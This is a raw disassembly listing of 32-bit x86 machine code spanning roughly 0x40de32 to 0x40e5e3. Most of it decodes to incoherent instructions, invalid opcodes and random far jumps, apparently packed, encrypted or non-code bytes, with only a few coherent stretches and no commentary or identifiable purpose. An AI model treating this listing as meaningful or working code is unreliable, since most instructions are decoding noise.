  40de32:	xchg   edx,eax
  40de33:	mov    edx,DWORD PTR [ebx]
  40de35:	mov    cl,0xc0
  40de37:	and    al,0x88
  40de39:	arpl   WORD PTR [edx+0x55b5ec15],sp
  40de3f:	mov    WORD PTR [eax+0x74],?
  40de42:	xchg   edi,eax
  40de43:	ret    0xaea7
  40de46:	retf   0x87e9
  40de49:	jns    0x40dde9
  40de4b:	jo     0x40deb8
  40de4d:	mov    ss,WORD PTR [esi-0x3a]
  40de50:	lock push ebx
  40de52:	mov    ebp,0x92909eeb
  40de57:	scas   eax,DWORD PTR es:[edi]
  40de58:	inc    ebx
  40de59:	(bad)  
  40de5a:	xlat   BYTE PTR ds:[ebx]
  40de5b:	ret    
  40de5c:	push   ebx
  40de5d:	sbb    ebx,esp
  40de5f:	jg     0x40dedd
  40de61:	jg     0x40dead
  40de63:	lds    esi,FWORD PTR [edx-0x4de2a566]
  40de69:	adc    cl,BYTE PTR [edi-0x69]
  40de6c:	jecxz  0x40ded7
  40de6e:	mov    ch,0x61
  40de70:	ret    0xd5ea
  40de73:	xor    eax,0xbc0ec7f2
  40de78:	jmp    0x254:0xa766c60c
  40de7f:	jb     0x40de29
  40de81:	jnp    0x40de88
  40de83:	lahf   
  40de84:	and    ecx,DWORD PTR [edx-0x2c60d6ab]
  40de8a:	sub    al,0xda
  40de8c:	adc    BYTE PTR [edi-0x4d0da11f],dh
  40de92:	push   ds
  40de93:	xchg   esp,eax
  40de94:	scas   eax,DWORD PTR es:[edi]
  40de95:	test   DWORD PTR [ecx+0x19b0efed],ecx
  40de9b:	xchg   esp,eax
  40de9c:	jns    0x40de39
  40de9e:	xlat   BYTE PTR ds:[ebx]
  40de9f:	ja     0x40de9f
  40dea1:	bound  esi,QWORD PTR [ecx-0x39043ecb]
  40dea7:	inc    eax
  40dea8:	ss jmp 0xf88f92ea
  40deae:	lods   eax,DWORD PTR ds:[esi]
  40deaf:	dec    ebp
  40deb0:	pop    ebp
  40deb1:	not    DWORD PTR [edi]
  40deb3:	test   BYTE PTR [esi+0x3b],al
  40deb6:	jb     0x40de64
  40deb8:	clc    
  40deb9:	mov    esp,0xf6e0607c
  40debe:	push   ebp
  40debf:	into   
  40dec0:	inc    ebx
  40dec1:	add    eax,0x888ca5a8
  40dec6:	fwait
  40dec7:	call   0x2c63:0x36599abe
  40dece:	jecxz  0x40de74
  40ded0:	stos   BYTE PTR es:[edi],al
  40ded1:	inc    eax
  40ded2:	sub    BYTE PTR [ebx-0x1b],bl
  40ded5:	mov    dh,0xfb
  40ded7:	mov    ds:0xa925e185,eax
  40dedc:	das    
  40dedd:	retf   
  40dede:	sub    al,0x15
  40dee0:	lds    ecx,FWORD PTR [edi-0x33]
  40dee3:	jp     0x40dec7
  40dee5:	add    eax,0xb4d68c09
  40deea:	mov    eax,ds:0x59dc0589
  40deef:	outs   dx,DWORD PTR ds:[esi]
  40def0:	shl    DWORD PTR [edx-0x76fe8f8d],1
  40def6:	lahf   
  40def7:	jmp    0x7511:0x60929a19
  40defe:	cmp    edx,DWORD PTR [edx+esi*4+0x1]
  40df02:	pop    ds
  40df03:	push   ebx
  40df04:	or     esi,DWORD PTR [edi]
  40df06:	mov    al,0xdb
  40df08:	jmp    0x950a81c2
  40df0d:	jmp    0x2ec6bdb8
  40df12:	fdiv   DWORD PTR [ecx+ebx*4]
  40df15:	ret    
  40df16:	and    al,0xeb
  40df18:	outs   dx,BYTE PTR ds:[esi]
  40df19:	mov    edi,0x98a7e7a9
  40df1e:	jle    0x40deb1
  40df20:	(bad)  
  40df21:	stos   BYTE PTR es:[edi],al
  40df22:	out    dx,al
  40df23:	jmp    0x40df1f
  40df25:	loop   0x40df61
  40df27:	sbb    al,0xf1
  40df29:	outs   dx,DWORD PTR ds:[esi]
  40df2a:	adc    esi,ebx
  40df2c:	sar    DWORD PTR [ecx-0x5f875da4],0xb9
  40df33:	iret   
  40df34:	sub    dh,ch
  40df36:	fbstp  TBYTE PTR [ebx+0x39]
  40df39:	mov    esp,cs
  40df3b:	jo     0x40df3d
  40df3d:	sub    eax,0x9431c3d0
  40df42:	jno    0x40df9a
  40df44:	push   edi
  40df45:	mov    DWORD PTR [eax+0x2a388068],edi
  40df4b:	popa   
  40df4c:	aam    0x34
  40df4e:	in     eax,dx
  40df4f:	sub    eax,0x7147e64e
  40df54:	mov    bh,0x38
  40df56:	fbld   TBYTE PTR [ecx-0x2e]
  40df59:	adc    eax,0x44b20d27
  40df5e:	sub    BYTE PTR [edi-0x4],bl
  40df61:	add    al,BYTE PTR [eax-0x72]
  40df64:	data16 xlat BYTE PTR ds:[ebx]
  40df66:	stc    
  40df67:	sbb    BYTE PTR [ebp-0x51],al
  40df6a:	loopne 0x40defe
  40df6c:	out    dx,al
  40df6d:	(bad)  
  40df6e:	out    dx,al
  40df6f:	stos   DWORD PTR es:[edi],eax
  40df70:	ror    BYTE PTR [esi+ebp*4-0x150ff27b],1
  40df77:	int3   
  40df78:	or     BYTE PTR [ecx],dl
  40df7a:	and    DWORD PTR [edx+0x45],0xffffff96
  40df7e:	ret    0x580b
  40df81:	ret    0xd7
  40df84:	test   dh,0x62
  40df87:	add    eax,0xe135c60
  40df8c:	mov    edx,0xd84c6645
  40df91:	push   ds
  40df92:	jb     0x40e00a
  40df94:	lods   eax,DWORD PTR ds:[esi]
  40df95:	sbb    al,0x70
  40df97:	sti    
  40df98:	xor    ebp,DWORD PTR [ebx]
  40df9a:	leave  
  40df9b:	mov    ebx,0x1ac3e9a6
  40dfa0:	pop    es
  40dfa1:	in     al,0x8c
  40dfa3:	jb     0x40dfae
  40dfa5:	js     0x40dffd
  40dfa7:	mov    ch,0xd5
  40dfa9:	mov    eax,0x4589c303
  40dfae:	lods   al,BYTE PTR ds:[esi]
  40dfaf:	not    DWORD PTR ds:0x42aa99
  40dfb5:	lea    eax,[ebp-0x1c]
  40dfb8:	mov    DWORD PTR [ebp-0x50],eax
  40dfbb:	mov    eax,DWORD PTR [ebp-0x60]
  40dfbe:	xor    eax,esi
  40dfc0:	add    eax,ebx
  40dfc2:	mov    DWORD PTR [ebp-0x60],eax
  40dfc5:	lea    eax,[ebp-0x60]
  40dfc8:	push   eax
  40dfc9:	mov    eax,DWORD PTR [ebp+0xc]
  40dfcc:	jmp    0x40e224
  40dfd1:	ds cmp eax,0xd1d1d2d2
  40dfd7:	rol    DWORD PTR ds:[ecx+0x5040413a],1
  40dfde:	lea    esp,[ebp+0x78b28874]
  40dfe4:	js     0x40e01b
  40dfe6:	jle    0x40e060
  40dfe8:	js     0x40e008
  40dfea:	jl     0x40df77
  40dfec:	enter  0xab8a,0xc
  40dff0:	inc    esi
  40dff1:	mov    al,0x3a
  40dff3:	fldenv [edi]
  40dff5:	add    al,0xc1
  40dff7:	add    DWORD PTR [edx-0x3c105a93],edi
  40dffd:	sub    al,0x7
  40dfff:	inc    esp
  40e000:	popa   
  40e001:	jle    0x40e00c
  40e003:	and    BYTE PTR [ebx-0x68ee5283],al
  40e009:	jnp    0x40e075
  40e00b:	push   es
  40e00c:	int3   
  40e00d:	or     al,al
  40e00f:	(bad)  
  40e011:	xor    DWORD PTR [edi],edi
  40e013:	sub    BYTE PTR [ebp-0x7c2bd12],0x4b
  40e01a:	sbb    bl,dl
  40e01c:	pop    ebp
  40e01d:	pop    ecx
  40e01e:	fist   DWORD PTR [esi]
  40e020:	ss ror ah,cl
  40e023:	xor    dh,BYTE PTR [edx-0x655234e1]
  40e029:	sbb    BYTE PTR [ebx],dh
  40e02b:	test   eax,0x4a41e451
  40e030:	popf   
  40e031:	fadd   QWORD PTR [ebx]
  40e033:	fidivr WORD PTR [edx+0x19f68ac6]
  40e039:	mov    DWORD PTR [edx],eax
  40e03b:	xchg   ebp,eax
  40e03c:	in     eax,dx
  40e03d:	outs   dx,DWORD PTR ds:[esi]
  40e03e:	les    ebp,FWORD PTR [esi-0x5c7045d0]
  40e044:	imul   esp,DWORD PTR [eax*8+0xb6ff21a],0xfffffffb
  40e04c:	(bad)  
  40e04d:	push   ss
  40e04e:	mov    eax,ds:0x8ef08ccf
  40e053:	pop    es
  40e054:	cdq    
  40e055:	das    
  40e056:	push   ebx
  40e057:	in     eax,dx
  40e058:	out    dx,al
  40e059:	addr16 xchg ch,dl
  40e05c:	aad    0x50
  40e05e:	repz fld QWORD PTR [edx+eiz*2+0x58]
  40e063:	mov    esi,0x6fe61b58
  40e068:	and    BYTE PTR [edx-0x2a],0x8f
  40e06c:	xor    DWORD PTR [eax-0x50],0xef856358
  40e073:	enter  0x41db,0x75
  40e077:	dec    ecx
  40e078:	fs sbb al,0x98
  40e07b:	or     DWORD PTR [esi+0x21],edx
  40e07e:	mov    eax,DWORD PTR [ebx]
  40e080:	nop
  40e081:	cmp    esp,esp
  40e083:	fisttp WORD PTR [eax+0x12]
  40e086:	add    dl,al
  40e088:	xor    BYTE PTR [edi+ebp*2],ch
  40e08b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e08c:	mov    ?,WORD PTR [edi+esi*8]
  40e08f:	add    BYTE PTR [esp+edx*1],ch
  40e092:	mov    ebp,0xd19b25c2
  40e097:	add    DWORD PTR [ebx+0x2edb92b],edi
  40e09d:	fsub   QWORD PTR [edx-0x7e8c3c54]
  40e0a3:	(bad)  
  40e0a4:	jmp    0x40e0c9
  40e0a6:	xor    eax,esi
  40e0a8:	popf   
  40e0a9:	mov    cl,0xb
  40e0ab:	aam    0x38
  40e0ad:	jbe    0x40e077
  40e0af:	inc    ecx
  40e0b0:	out    dx,al
  40e0b1:	jmp    0x226117df
  40e0b6:	sub    BYTE PTR [eax+edi*8+0x239933ec],0x1e
  40e0be:	sub    edi,ebx
  40e0c0:	loop   0x40e0f2
  40e0c2:	pop    ss
  40e0c3:	ss push 0x30be47c3
  40e0c9:	and    DWORD PTR fs:[edi],0x8682cff5
  40e0d0:	mov    edi,0xbef05b47
  40e0d5:	mov    DWORD PTR [ebx+0x47ae85c],ecx
  40e0db:	jecxz  0x40e077
  40e0dd:	ss in  eax,dx
  40e0df:	dec    esi
  40e0e0:	(bad)  
  40e0e1:	mov    ecx,0xdf122dfe
  40e0e6:	aad    0x31
  40e0e8:	in     eax,dx
  40e0e9:	xchg   ecx,eax
  40e0ea:	xchg   esp,eax
  40e0eb:	lods   al,BYTE PTR ds:[esi]
  40e0ed:	rcl    DWORD PTR ds:0x41b7d8eb,0xe4
  40e0f4:	arpl   WORD PTR [edx],cx
  40e0f6:	push   edx
  40e0f7:	rdtsc  
  40e0f9:	jle    0x40e148
  40e0fb:	add    eax,0x51f68fd9
  40e100:	mov    al,0x5a
  40e102:	imul   esp,ebx,0x4a
  40e105:	imul   ebp,DWORD PTR [esi-0x62e91463],0x46
  40e10c:	aaa    
  40e10d:	in     al,dx
  40e10e:	ret    
  40e10f:	lods   eax,DWORD PTR ds:[esi]
  40e110:	inc    esi
  40e111:	dec    ebx
  40e112:	xchg   ecx,eax
  40e113:	(bad)  [esi+0x6f84c9f9]
  40e119:	in     eax,0x3
  40e11b:	or     BYTE PTR [ebx-0x24236aff],dl
  40e121:	jbe    0x40e125
  40e123:	push   ebx
  40e124:	dec    esp
  40e125:	fstp   TBYTE PTR [edx-0x56593092]
  40e12b:	mov    ebx,0x8c71e14f
  40e130:	or     BYTE PTR [ebx-0x63],ch
  40e133:	cmp    edi,DWORD PTR [edx-0x7d]
  40e136:	ja     0x40e145
  40e138:	fwait
  40e139:	xlat   BYTE PTR ds:[ebx]
  40e13a:	or     al,0x55
  40e13c:	add    DWORD PTR [eax+0x727b7806],esp
  40e142:	mov    bh,0x14
  40e144:	add    al,0xaf
  40e146:	aaa    
  40e147:	mov    esp,0x8054c90f
  40e14c:	int3   
  40e14d:	sub    eax,0x87049534
  40e152:	clc    
  40e153:	outs   dx,DWORD PTR ds:[esi]
  40e154:	inc    esi
  40e155:	aas    
  40e156:	shl    DWORD PTR ds:0x3e95ba52,1
  40e15c:	mov    cl,0x9e
  40e15e:	fcmovu st,st(4)
  40e160:	push   ebx
  40e161:	xor    DWORD PTR [edi+ecx*1-0x643f33c4],esp
  40e168:	inc    edx
  40e169:	sbb    eax,0x3837cbdf
  40e16e:	sbb    DWORD PTR [esi],0xb5d2a4a7
  40e174:	(bad)
  40e177:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40e179:	shl    DWORD PTR [edx+0x4b8742f4],cl
  40e17f:	jns    0x40e14c
  40e181:	push   ebp
  40e182:	push   ds
  40e183:	jmp    0x4911c1b1
  40e188:	inc    edx
  40e189:	out    dx,al
  40e18a:	mov    eax,DWORD PTR [eax-0x5617643b]
  40e190:	adc    dh,BYTE PTR ds:0xdfb2daca
  40e196:	cmp    eax,eax
  40e198:	pop    esi
  40e199:	add    bl,BYTE PTR [esp+ecx*1+0x70b9120a]
  40e1a0:	push   edx
  40e1a1:	popa   
  40e1a2:	pushf  
  40e1a3:	xlat   BYTE PTR ds:[ebx]
  40e1a4:	aaa    
  40e1a5:	cmp    BYTE PTR [esi-0x47],bl
  40e1a8:	jmp    0x5a227599
  40e1ad:	pop    ebx
  40e1ae:	loope  0x40e180
  40e1b0:	scas   al,BYTE PTR es:[edi]
  40e1b1:	je     0x40e15c
  40e1b3:	clc    
  40e1b4:	xchg   edi,esi
  40e1b6:	sbb    BYTE PTR [esp+ebx*2+0x4f],bl
  40e1ba:	adc    BYTE PTR ds:0x8cfb083d,bh
  40e1c0:	dec    esp
  40e1c1:	pop    edi
  40e1c2:	retf   0xd829
  40e1c5:	leave  
  40e1c6:	sbb    BYTE PTR [eax+ecx*1+0x5a650f9d],bh
  40e1cd:	dec    ebp
  40e1ce:	in     eax,dx
  40e1cf:	mov    ebp,0x413a18f9
  40e1d4:	mov    al,0x13
  40e1d6:	inc    eax
  40e1d7:	mov    edi,DWORD PTR [edi+edx*8]
  40e1da:	outs   dx,BYTE PTR ds:[esi]
  40e1db:	test   eax,0xbedfa655
  40e1e0:	sar    DWORD PTR [eax+0x60],0x63
  40e1e4:	test   al,0xaa
  40e1e6:	or     al,0xcc
  40e1e8:	(bad)  
  40e1e9:	outs   dx,BYTE PTR ds:[esi]
  40e1ea:	mov    ds:0xeec0fa0c,al
  40e1ef:	ss jb  0x40e244
  40e1f2:	sbb    ebp,edx
  40e1f4:	mov    bl,0x32
  40e1f6:	pushf  
  40e1f7:	ror    DWORD PTR [edx+0x131092b8],1
  40e1fd:	loopne 0x40e270
  40e1ff:	dec    edi
  40e200:	cmc    
  40e201:	jae    0x40e1f1
  40e203:	or     bh,BYTE PTR [esi+0x72ca4920]
  40e209:	hlt    
  40e20a:	sahf   
  40e20b:	es xchg ebx,eax
  40e20d:	sub    eax,0x3cf06def
  40e212:	sbb    eax,DWORD PTR [ecx]
  40e214:	ret    0x9a34
  40e217:	call   0x6e8b45d4
  40e21c:	push   0x7c
  40e21e:	test   eax,0x6bcaca26
  40e223:	push   0x33
  40e225:	mov    BYTE PTR [ebx],0xc3
  40e228:	push   eax
  40e229:	jmp    0x40e481
  40e22e:	(bad)  
  40e22f:	xlat   BYTE PTR ds:[ebx]
  40e230:	(bad)  
  40e231:	retf   0xc9d5
  40e234:	fcmovu st,st(3)
  40e236:	aas    
  40e237:	cmp    al,0x7f
  40e239:	push   es
  40e23a:	in     eax,0x8a
  40e23c:	push   0xffffff91
  40e23e:	inc    ebp
  40e23f:	mov    al,0x78
  40e241:	js     0x40e278
  40e243:	jle    0x40e2bd
  40e245:	js     0x40e2b3
  40e247:	add    al,0x58
  40e249:	mov    dh,0xfc
  40e24b:	push   ebx
  40e24c:	sub    DWORD PTR [ebp-0x4b86d36d],esi
  40e252:	int3   
  40e253:	push   edi
  40e254:	imul   esi,edi,0xe1f2b3ed
  40e25a:	mov    cl,0x13
  40e25c:	sbb    al,0xdc
  40e25e:	jle    0x40e244
  40e260:	scas   eax,DWORD PTR es:[di]
  40e262:	mov    al,0x7d
  40e264:	enter  0x4177,0x82
  40e268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e269:	or     DWORD PTR [ebp-0x4d],eax
  40e26c:	mov    ebp,0x7e3fd35a
  40e271:	xchg   edx,eax
  40e272:	(bad)  [ecx-0x93a1852]
  40e278:	loope  0x40e2ef
  40e27a:	and    dh,BYTE PTR [ecx]
  40e27c:	leave  
  40e27d:	xchg   edi,eax
  40e27e:	out    dx,al
  40e27f:	adc    dh,BYTE PTR [edi+0x5e630af1]
  40e285:	data16 add dh,BYTE PTR [esi-0x433b7d96]
  40e28c:	outs   dx,BYTE PTR ds:[esi]
  40e28d:	inc    ecx
  40e28e:	jbe    0x40e2aa
  40e290:	sti    
  40e291:	xchg   DWORD PTR [eax],ebx
  40e293:	mov    ecx,0xd33fd09e
  40e298:	(bad)  
  40e299:	ror    BYTE PTR [ecx+0x7ab76b00],0xea
  40e2a0:	(bad)  
  40e2a2:	sub    eax,0xfb882bd
  40e2a7:	or     edi,DWORD PTR [eax-0x3b9f0128]
  40e2ad:	cs dec edi
  40e2af:	das    
  40e2b0:	sbb    al,BYTE PTR [eax-0x6512137f]
  40e2b6:	xchg   dl,dl
  40e2b8:	les    esp,FWORD PTR [ebp+0x6]
  40e2bb:	and    al,0x9e
  40e2bd:	inc    ecx
  40e2be:	int3   
  40e2bf:	pop    ebp
  40e2c0:	cmp    BYTE PTR [esi-0x4acd6421],cl
  40e2c6:	mov    bh,0xe1
  40e2c8:	sti    
  40e2c9:	add    cl,BYTE PTR [edi]
  40e2cb:	std    
  40e2cc:	adc    BYTE PTR [edi-0x53],bh
  40e2cf:	and    edx,DWORD PTR [eax]
  40e2d1:	push   eax
  40e2d2:	mov    cl,0x2c
  40e2d4:	xchg   ecx,eax
  40e2d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e2d6:	test   BYTE PTR [edx+0x6],dl
  40e2d9:	imul   ecx,DWORD PTR [edi-0x7519d6da],0x63594103
  40e2e3:	int3   
  40e2e4:	popa   
  40e2e5:	mov    bl,0x4d
  40e2e7:	add    BYTE PTR [ebp+0x4e],ah
  40e2ea:	test   eax,0xac651fa1
  40e2ef:	pop    eax
  40e2f0:	inc    edx
  40e2f1:	mov    ds:0x6d0fff30,al
  40e2f6:	mov    al,ds:0xcda37899
  40e2fb:	xchg   ecx,eax
  40e2fc:	dec    esp
  40e2fd:	enter  0x58ea,0xc4
  40e301:	inc    edx
  40e302:	mov    ds:0x165bb230,eax
  40e307:	xor    ch,0xcf
  40e30a:	aad    0xa4
  40e30c:	xchg   ebx,eax
  40e30d:	aaa    
  40e30e:	clc    
  40e30f:	and    al,0xf4
  40e311:	or     BYTE PTR [esp+edi*1+0x7dd1c506],bl
  40e318:	xor    eax,0xd3a48951
  40e31d:	adc    ecx,esp
  40e31f:	dec    ecx
  40e320:	retf   
  40e321:	xchg   DWORD PTR [edx-0x3e],edx
  40e324:	int    0x72
  40e326:	pop    ss
  40e327:	jp     0x40e2d1
  40e329:	jnp    0x40e35a
  40e32b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e32c:	gs jl  0x40e309
  40e32f:	mov    dh,0x35
  40e331:	or     edx,DWORD PTR [ecx+0x824ffff]
  40e337:	mov    fs:0xc3fbf8a2,al
  40e33d:	icebp  
  40e33e:	out    dx,eax
  40e33f:	pop    es
  40e340:	fdiv   DWORD PTR [edx+edi*4]
  40e343:	xor    al,0xd2
  40e345:	aas    
  40e346:	imul   BYTE PTR [edx+0x2f695259]
  40e34c:	add    edi,DWORD PTR [edi+0x3a9d64a9]
  40e352:	rcr    BYTE PTR [esi+0x4a1710f4],cl
  40e358:	retf   0x71b1
  40e35b:	lods   al,BYTE PTR ds:[esi]
  40e35c:	popf   
  40e35d:	enter  0xbacc,0x2c
  40e361:	mov    ds:0xcdfed024,eax
  40e366:	cli    
  40e367:	dec    edi
  40e368:	nop
  40e369:	mov    eax,0x2aa8d948
  40e36e:	imul   edx,DWORD PTR [ecx-0x3a],0xd9cc0a74
  40e375:	lods   eax,DWORD PTR ds:[esi]
  40e376:	or     bl,BYTE PTR [ebp-0x58]
  40e379:	inc    edx
  40e37a:	ds aad 0x5b
  40e37d:	je     0x40e3b9
  40e37f:	adc    eax,0x6523bf97
  40e384:	outs   dx,WORD PTR ds:[esi]
  40e386:	jnp    0x40e33b
  40e388:	sbb    eax,0xbaab3d80
  40e38d:	stos   BYTE PTR es:[edi],al
  40e38e:	stos   DWORD PTR es:[edi],eax
  40e38f:	xchg   edi,eax
  40e390:	neg    DWORD PTR ds:0x12a1e2ce
  40e396:	add    BYTE PTR [ebp-0x29aebfac],ch
  40e39c:	push   ecx
  40e39d:	(bad)  
  40e39e:	outs   dx,DWORD PTR ds:[esi]
  40e39f:	push   cs
  40e3a0:	mov    bl,0xb8
  40e3a2:	(bad)  
  40e3a3:	or     bl,ch
  40e3a5:	test   BYTE PTR [ebp-0x51],0xbe
  40e3a9:	inc    ecx
  40e3aa:	add    DWORD PTR [ebx],esp
  40e3ac:	int    0xb4
  40e3ae:	push   ebx
  40e3af:	ja     0x40e3d6
  40e3b1:	mov    bh,0x74
  40e3b3:	mov    ecx,0x278acbb1
  40e3b8:	mov    esp,0xf6c2e1f8
  40e3bd:	call   0x94719dd8
  40e3c2:	mov    esi,0xf7341018
  40e3c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3c8:	dec    ecx
  40e3c9:	and    BYTE PTR [edx+0x2c103916],cl
  40e3cf:	sub    ebp,DWORD PTR [ecx+0x1ecc4d33]
  40e3d5:	rcl    DWORD PTR ds:0x864a9f2c,0x82
  40e3dc:	xor    BYTE PTR [edi+0xf4d69be],dl
  40e3e2:	inc    eax
  40e3e3:	sub    eax,0x6024468c
  40e3e8:	cmp    DWORD PTR [ecx],ebx
  40e3ea:	outs   dx,BYTE PTR ds:[esi]
  40e3eb:	sbb    al,0x6c
  40e3ed:	adc    al,0x81
  40e3ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3f0:	push   cs
  40e3f1:	jb     0x40e3a2
  40e3f3:	rcr    dh,1
  40e3f5:	lahf   
  40e3f6:	sahf   
  40e3f7:	pop    ss
  40e3f8:	and    edx,ebp
  40e3fa:	mov    bh,0x4
  40e3fc:	cmp    bl,dh
  40e3fe:	int3   
  40e3ff:	mov    ebx,0x478f4eda
  40e404:	mov    ds:0xf6b4d2a1,al
  40e409:	out    dx,al
  40e40a:	shr    DWORD PTR [ebx],cl
  40e40c:	(bad)  
  40e40d:	jmp    DWORD PTR [ebp+0x22cf6d82]
  40e413:	xor    esp,ebp
  40e415:	jno    0x40e3d9
  40e417:	(bad)  
  40e418:	push   ebx
  40e419:	sbb    ebx,eax
  40e41b:	dec    edi
  40e41c:	ss adc eax,0x4cde06fb
  40e422:	xor    edx,ecx
  40e424:	jae    0x40e43a
  40e426:	cmp    BYTE PTR [eax],0x8e
  40e429:	push   ds
  40e42a:	mov    esp,0x5e874079
  40e42f:	push   ss
  40e430:	cmp    eax,0xf4b59250
  40e435:	js     0x40e3f7
  40e437:	pop    es
  40e438:	adc    al,0x9b
  40e43a:	repz sbb BYTE PTR [ebx],cl
  40e43d:	push   edi
  40e43e:	(bad)  
  40e43f:	mov    esi,?
  40e441:	mov    ah,0xfd
  40e443:	stos   DWORD PTR es:[edi],eax
  40e444:	stc    
  40e445:	in     al,dx
  40e446:	aaa    
  40e447:	or     esp,DWORD PTR [esi]
  40e449:	sub    ebx,ebp
  40e44b:	rdseed edi
  40e44e:	cmp    BYTE PTR [ecx+0x37],0xaf
  40e452:	mov    BYTE PTR [ebx-0xf],dl
  40e455:	sbb    eax,0x9fad633e
  40e45a:	dec    edx
  40e45b:	or     eax,0xec4d9e6
  40e460:	aas    
  40e461:	xlat   BYTE PTR ds:[ebx]
  40e462:	imul   ebx,DWORD PTR [ecx+esi*4-0x5a],0x6be005c
  40e46a:	sub    al,0xe9
  40e46c:	add    al,0x3e
  40e46e:	ja     0x40e48f
  40e470:	and    al,0xf1
  40e472:	ins    DWORD PTR es:[edi],dx
  40e473:	cdq    
  40e474:	and    BYTE PTR [ebx+0x44],al
  40e477:	ja     0x40e45f
  40e479:	xchg   ebx,eax
  40e47a:	jnp    0x40e4ec
  40e47c:	loope  0x40e451
  40e47e:	loope  0x40e413
  40e480:	fsub   DWORD PTR [ecx+0x41eb06]
  40e486:	push   0x41ea5c
  40e48b:	push   DWORD PTR [eax]
  40e48d:	call   0x419198
  40e492:	jmp    0x40e979
  40e497:	cmp    edi,0x13c
  40e49d:	jne    0x40e979
  40e4a3:	mov    eax,DWORD PTR [ebp-0x10]
  40e4a6:	jmp    0x40e6fe
  40e4ab:	sar    DWORD PTR ds:[esi],0xca
  40e4af:	ror    ecx,0xca
  40e4b2:	leave  
  40e4b3:	(bad)  
  40e4b4:	dec    eax
  40e4b5:	cmc    
  40e4b6:	adc    ebx,ecx
  40e4b8:	cmp    ch,BYTE PTR [eax+0x78b5022b]
  40e4be:	js     0x40e4f5
  40e4c0:	jle    0x40e53a
  40e4c2:	js     0x40e542
  40e4c4:	fisttp DWORD PTR [eax+eiz*8+0x2e]
  40e4c8:	setnp  BYTE PTR [edi+0xc67ab7]
  40e4cf:	inc    ebp
  40e4d0:	inc    esp
  40e4d1:	in     eax,dx
  40e4d2:	fisttp DWORD PTR [edi]
  40e4d4:	pop    ebx
  40e4d5:	(bad)  
  40e4d6:	mov    ds:0x77932d56,al
  40e4db:	sub    eax,0xa2379f2c
  40e4e0:	dec    ebp
  40e4e1:	(bad)  
  40e4e3:	xlat   BYTE PTR ds:[ebx]
  40e4e4:	cwde   
  40e4e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e4e6:	mov    ?,WORD PTR [esi+edi*1+0x5d]
  40e4ea:	pop    esi
  40e4eb:	push   ds
  40e4ec:	pop    DWORD PTR [ebp-0x53]
  40e4ef:	push   ecx
  40e4f0:	(bad)  
  40e4f1:	ret    0xa648
  40e4f4:	mov    ds:0x11b2d2,eax
  40e4f9:	(bad)  
  40e4fa:	inc    esi
  40e4fb:	xchg   ebx,eax
  40e4fc:	or     ebp,edx
  40e4fe:	xchg   ebx,eax
  40e4ff:	inc    eax
  40e500:	or     ebp,edi
  40e502:	jb     0x40e539
  40e504:	pop    ds
  40e505:	add    eax,0x5465758b
  40e50a:	scas   al,BYTE PTR es:[edi]
  40e50b:	js     0x40e556
  40e50d:	clc    
  40e50e:	add    eax,0x905d8aed
  40e513:	scas   al,BYTE PTR es:[edi]
  40e514:	xlat   BYTE PTR fs:[ebx]
  40e516:	call   0xfe0754e0
  40e51b:	jp     0x40e514
  40e51d:	xchg   edx,eax
  40e51e:	cdq    
  40e51f:	xor    eax,0x428f0376
  40e524:	imul   ebp,eax,0xffffffa3
  40e527:	retf   0x6e16
  40e52a:	into   
  40e52b:	xchg   ebx,eax
  40e52c:	lahf   
  40e52d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e52e:	mov    esp,0x66f3fb26
  40e533:	retf   
  40e534:	xor    BYTE PTR [eax-0x4a179e4],bl
  40e53a:	inc    eax
  40e53b:	std    
  40e53c:	mov    ch,0x97
  40e53e:	xor    al,0x2f
  40e541:	inc    esi
  40e542:	mov    es,WORD PTR [edx+ecx*1+0xd]
  40e546:	mov    ch,0x9b
  40e548:	push   ebp
  40e549:	popa   
  40e54a:	aad    0xba
  40e54c:	imul   esi,DWORD PTR [ecx-0x3d92eb8e],0xcde56be5
  40e556:	or     BYTE PTR [edx+0x71],al
  40e559:	add    eax,0x760754a7
  40e55e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e55f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e560:	push   eax
  40e561:	dec    esi
  40e562:	out    dx,eax
  40e563:	dec    ecx
  40e564:	pop    ss
  40e565:	mov    ds:0xfa755dd5,eax
  40e56a:	and    dh,al
  40e56c:	jae    0x40e5c2
  40e56e:	mov    eax,ds:0x966a819f
  40e573:	ss rcl DWORD PTR cs:[ecx+0x77476c9d],0x38
  40e57c:	lods   al,BYTE PTR ds:[esi]
  40e57d:	cmp    edx,ebx
  40e57f:	int    0x1d
  40e581:	daa    
  40e582:	and    DWORD PTR [ebp-0x28],ecx
  40e585:	pop    eax
  40e586:	jmp    0x40e5eb
  40e588:	cmp    DWORD PTR [ebp-0x7d021a4e],eax
  40e58e:	inc    ebp
  40e58f:	mov    al,ds:0x613cf42c
  40e594:	and    ecx,edx
  40e596:	ret    
  40e597:	fild   QWORD PTR [eax+0x6f]
  40e59a:	pop    es
  40e59b:	and    eax,DWORD PTR [ecx]
  40e59d:	jno    0x40e525
  40e59f:	mov    ds:0x5fecf038,eax
  40e5a4:	jne    0x40e565
  40e5a6:	(bad)  [edi]
  40e5a8:	sbb    BYTE PTR [ebx+ebx*2+0x78facae1],bh
  40e5af:	fsubp  st(3),st
  40e5b1:	xchg   edx,eax
  40e5b2:	addr16 into 
  40e5b4:	daa    
  40e5b5:	pop    ecx
  40e5b6:	cmp    bh,BYTE PTR ds:0x73632b13
  40e5bc:	fsubr  DWORD PTR [edi+0x2b]
  40e5bf:	mov    ecx,0x979e0390
  40e5c4:	xchg   BYTE PTR fs:[edx-0x39fedd9],bl
  40e5cb:	cs (bad) 
  40e5cd:	mov    edx,0xeaf27d6e
  40e5d2:	xchg   ebx,eax
  40e5d3:	outs   dx,DWORD PTR ds:[esi]
  40e5d4:	jl     0x40e62d
  40e5d6:	xchg   esp,eax
  40e5d7:	cmp    al,0xf1
  40e5d9:	mov    ds:0xb2579ef8,al
  40e5de:	test   esi,eax
  40e5e0:	mov    ch,0x0
  40e5e2:	cwde   
  40e5e3:	xchg   ecx,eax
